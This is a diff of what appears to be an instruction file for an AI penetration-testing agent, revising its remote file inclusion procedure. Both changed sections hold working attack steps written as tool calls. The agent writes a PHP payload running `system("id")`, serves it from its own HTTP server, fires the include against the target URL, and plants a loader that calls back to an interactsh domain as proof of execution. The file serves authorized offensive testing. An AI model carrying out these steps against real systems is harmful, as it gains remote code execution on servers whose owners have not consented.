@@ -406,19 +406,32 @@ abandoning the sink -- a failed LOCAL read never proves an inclusion sink dead.
 RFI needs (a) a sink that fetches+interprets a URL and (b) a server the TARGET
 can reach. Two delivery modes; ALWAYS try Mode 1 first:
 
-**Mode 1 -- self-hosted on your own box (NO external OOB; always available).**
-In an isolated lab / internal engagement the target usually has NO internet
-egress but CAN reach an attacker host on a network it shares. Host the payload
-yourself and point the sink at your own IP -- this is in-band, in-scope infra
-you control, so it does NOT depend on the external-OOB toggle:
+**Mode 1 -- self-hosted on your own box (NO external OOB; needs a target-reachable
+inbound port).** Your Kali sandbox exposes exactly ONE inbound port the target can
+reach: your reverse handler port. Mode 1 works ONLY when you have one; if you do not,
+skip to Mode 2 (interactsh). This is in-band, in-scope infra you control, so it does NOT
+depend on the external-OOB toggle.
 
-1. Find an address the target can reach you on: enumerate every network your
-   box shares with the target plus the target's default gateway
-   (`kali_shell` -> `ip -o addr`, `ip route`). On container/bridged labs the
-   shared-subnet IP or the `.1` gateway is almost always routable back to you.
-2. Stand up a plain HTTP server serving your payload file:
+1. Two DIFFERENT numbers, both from the "Pre-Configured Payload Settings" block -- do
+   NOT read your address from `ip -o addr` (the container's view, not what the target
+   reaches) and do NOT use 8000 (the sandbox's own service):
+   - the server LISTENS on your handler port: the pool port, or `4444` when a tunnel is
+     active (its ReverseListenerBindPort). With ngrok these two differ.
+   - the TARGET's URL is the block's `LHOST:LPORT` (LPORT is the public port a tunnel
+     forwards in, or the pool port).
+2. That listen port is your reverse handler's: run `jobs` (msfconsole) / `ss -ltn`
+   FIRST -- while this HTTP server holds the port, NO Metasploit handler can bind it, for
+   ANY of your chats, so free it as soon as the proof lands. Serve a DEDICATED folder
+   holding only the payload file (never serve `/tmp`: execute_code leaves scripts with
+   target creds there), capture the PID, and confirm the bind with a curl to localhost
+   (a backgrounded `(... &)` prints success even when the bind FAILED). Keep python the ONLY
+   backgrounded command -- setup joined by `;`, every stream redirected, the log OUTSIDE the
+   served folder: backgrounding an `&&` list holds kali_shell's output pipe open until its
+   300 s timeout, `$!` is then the subshell (killing it leaves python serving), and a log
+   inside the folder is readable by the target:
    ```
-   kali_shell({{"command": "mkdir -p /tmp/rfi && printf '%s' '<?php system(\\"id\\"); ?>' > /tmp/rfi/p.php && cd /tmp/rfi && (python3 -m http.server 8000 >/tmp/rfi.log 2>&1 &) && echo up"}})
+   kali_shell({{"command": "mkdir -p /tmp/rfi && printf '%s' '<?php system(\\"id\\"); ?>' > /tmp/rfi/p.php; python3 -m http.server <listen_port> --directory /tmp/rfi >/tmp/rfi.srv.log 2>&1 </dev/null & echo $!"}})
+   kali_shell({{"command": "curl -s http://127.0.0.1:<listen_port>/p.php >/dev/null && echo up"}})
    ```
 3. **Match the sink's exact path construction.** Inclusion sinks frequently
    CONCATENATE a fixed suffix onto your input -- the code may be
@@ -427,16 +440,17 @@ you control, so it does NOT depend on the external-OOB toggle:
    must live at that appended suffix under your server root. Recover the suffix
    from an error/warning, a redirect, or by diffing which path the sink reports
    missing; then create it. Example: if the appended suffix were `/loader.php`,
-   serve `/tmp/rfi/loader.php` and pass `param=http://<your-ip>:8000` so the sink
-   builds `http://<your-ip>:8000/loader.php`. If nothing is appended, host any
-   name and pass the full URL to it.
+   serve `/tmp/rfi/loader.php` and pass `param=http://LHOST:LPORT` so the sink builds
+   `http://LHOST:LPORT/loader.php` (LHOST:LPORT from the block). If nothing is appended,
+   host any name and pass the full URL to it.
 4. Fire the include and read command output INLINE:
    ```
-   execute_curl({{"args": "-s 'http://TARGET/vuln.ext?param=http://YOUR_IP:8000'"}})
+   execute_curl({{"args": "-s 'http://TARGET/vuln.ext?param=http://LHOST:LPORT'"}})
    ```
    A remote include that executes returns your payload's OUTPUT in the response
    body (Level-4 RCE), not merely a network ping. Prove execution with a
-   harmless `id`/`uname -a` first, then read the objective.
+   harmless `id`/`uname -a` first, then read the objective, then `kill <that PID>` to
+   free the handler port.
 
 Scheme/round-trip variants when the plain `http://` form is rejected:
 ```
@@ -942,12 +956,19 @@ A successful HTTP callback to interactsh proves the sink fetches remote URLs
 payload and observe a second-stage callback from the executed code:
 
 ```
-kali_shell({"command": "echo '<?php file_get_contents(\\"http://REGISTERED_DOMAIN/exec.txt\\"); ?>' > /tmp/payload.php"})
-kali_shell({"command": "python3 -m http.server 8000 --directory /tmp & echo $!"})
-# expose the server via chisel/ngrok if behind NAT, then point the RFI at it.
-# If the target shares a network with you (isolated lab / internal engagement),
-# skip the tunnel entirely: serve on your shared-network IP and point the RFI
-# straight at http://<your-shared-ip>:8000/ -- see Step 4C Mode 1 (no OOB needed).
+# Serve the loader on your ONE target-reachable inbound port exactly as Step 4C Mode 1:
+# the server LISTENS on your handler port (pool port, or 4444 with a tunnel, its
+# ReverseListenerBindPort); the TARGET reaches you at the block's LHOST:LPORT (the public
+# port a tunnel forwards in). That is your reverse handler's port -- `jobs` / `ss -ltn`
+# first, it blocks every handler on that port across all your chats while it runs, and
+# `kill` it once the proof lands. Never serve /tmp (execute_code leaves scripts with
+# target creds there); use a dedicated folder with only the loader. Not 8000; no `ip -o addr`.
+# Start form as Mode 1: setup joined by `;`, python ALONE in the background, all streams
+# redirected, the log outside the served folder.
+kali_shell({"command": "mkdir -p /tmp/rfi2 && echo '<?php file_get_contents(\\"http://REGISTERED_DOMAIN/exec.txt\\"); ?>' > /tmp/rfi2/loader.php; python3 -m http.server <listen_port> --directory /tmp/rfi2 >/tmp/rfi2.srv.log 2>&1 </dev/null & echo $!"})
+kali_shell({"command": "curl -s http://127.0.0.1:<listen_port>/loader.php >/dev/null && echo up"})
+# Point the RFI at http://LHOST:LPORT/loader.php (from the block). With NO reachable
+# inbound port, stay on the interactsh fetch-proof above instead.
 ```
 
 A `/exec.txt` HTTP callback in the interactsh log = remote code executed
